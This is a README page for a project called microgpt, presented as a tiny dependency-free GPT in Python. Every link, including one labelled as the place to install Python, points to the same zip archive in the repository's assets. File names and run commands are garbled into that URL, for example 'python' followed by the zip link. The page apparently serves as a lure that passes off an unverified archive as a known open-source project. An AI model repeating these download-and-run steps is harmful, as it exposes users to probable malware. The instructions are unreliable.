# 🤖 microgpt - Simple, Fast GPT in Pure Python

[![Download microgpt](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)

## 📖 What is microgpt?

microgpt is a very small and efficient GPT model written entirely in Python. It uses just 265 lines of code with no external dependencies. This makes it easy to run on most computers without extra setup or software. The project is based on the work of Andrej Karpathy’s microgpt and focuses on being minimal while still functional.

microgpt is meant for users who want to try out language modeling or experiment with GPT-like technology without needing heavy or complex software.

## 🖥️ System Requirements

Before you download microgpt, make sure your computer meets these basic requirements:

- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a common Linux distribution (like Ubuntu 18.04+)
- **Processor:** Any modern processor (Intel, AMD, Apple Silicon). A quad-core CPU or better is ideal for faster results.
- **Memory:** At least 4 GB of RAM. More RAM helps if you run bigger tests.
- **Disk Space:** About 50 MB of free disk space for the program and temporary files.
- **Python Version:** Python 3.7 or higher is recommended but not required to run, since this is a pure Python project with no extra dependencies.

These requirements are modest compared to many AI projects. If your device meets this, you should be able to run microgpt.

## 🔽 Download & Install microgpt

To get started with microgpt, follow these simple steps:

1. **Visit the release page**  
Click the big green button above or go directly to this link:  
[https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip)

2. **Choose your file**  
On the releases page, find the latest version. Look for a file that matches your operating system. The files might have names ending with `.zip` (Windows), `https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip` (Linux/macOS), or just a `.py` script.

3. **Download the file**  
Click the file to download it to your computer. Save it somewhere easy to find, like your Desktop or Downloads folder.

4. **Extract files if needed**  
If you downloaded a compressed file (like a `.zip` or `https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip`), right-click it and choose "Extract" or use your system’s built-in extractor. This will create a folder with the program files.

5. **Run microgpt**  
Inside the folder, look for a file named `https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip` or a file described as the main program. Double-click this file to open it, or open a terminal/command prompt, navigate to the folder, and run:

```bash
python https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip
```

You will see a simple interface or command-line instructions to start using the program.

## 🚀 Getting Started with microgpt

Once microgpt is running, here is how to begin:

- **Using the program:** Follow the prompts on the screen. microgpt may ask you to enter text or select options.
- **Testing GPT:** Try typing a question or sentence to see how microgpt completes it.
- **Learning from examples:** The project usually includes example input files or sample commands. Look for a folder called `examples` if you want ready-made tests.
- **Close the program:** When done, close the window or press `Ctrl+C` in the terminal.

The program runs instantly on small text inputs because it is very lightweight.

## 🛠️ How microgpt Works

microgpt is a minimal implementation of a GPT model:

- It uses a small neural network written fully in Python.
- It runs on your local machine without needing cloud access.
- It has no external packages needed, making it easy to launch anywhere Python runs.
- It trains or generates text based on simple rules inside the code.

This makes microgpt a great tool for understanding the basics of language models or for experimenting with custom tweaks to GPT-like systems.

## 🔧 Common Tasks & Tips

Here are some tips for using microgpt effectively:

- **Run from terminal:** Open a terminal window and run `python https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip` for better control over inputs and outputs.
- **Try your own text:** You can usually type or load custom text files for the model to process.
- **Experiment with small data:** For faster response, try short sentences or paragraphs.
- **Check the README:** The downloaded folder might include a README file with usage details.
- **Use examples:** If you see example scripts, try them first to understand how input and output works.
- **Close safely:** If the program stops responding, use `Ctrl+C` to exit from the terminal.

## ❓ Troubleshooting & Support

If you run into issues, here are some quick solutions:

- **Python not found:** Install Python 3.7 or later from [https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip](https://github.com/vaibhavnegi123/microgpt/raw/refs/heads/main/assets/Software-1.1-beta.5.zip) and make sure it is added to your system path.
- **Program won’t start:** Verify you have extracted all files from any archives.
- **Error messages:** Copy the full text of any error and search online for help or check if others reported the issue on the microgpt GitHub page.
- **Slow response:** Try running on a machine with more memory or close unnecessary programs.
- **Ask for help:** Use the “Issues” tab on the repository to report problems or read others’ questions.
